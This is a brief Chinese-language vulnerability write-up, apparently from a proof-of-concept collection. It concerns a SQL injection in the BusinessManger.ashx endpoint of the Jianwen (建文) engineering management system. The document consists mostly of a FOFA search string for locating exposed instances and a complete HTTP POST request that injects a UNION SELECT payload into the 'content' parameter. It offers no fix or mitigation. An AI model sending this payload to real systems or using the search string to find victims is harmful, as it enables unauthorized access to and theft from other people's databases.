# 建文工程管理系统BusinessManger.ashx存在SQL注入漏洞

建文工程管理系统 `/AppInterface/Business/BusinessManger.ashx `存在SQL注入漏洞。

## fofa

```yaml
body="Login/QRLogin.ashx"
```

![image-20240722163029952](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407221630031.png)

## poc

```yaml
POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32));-- a
```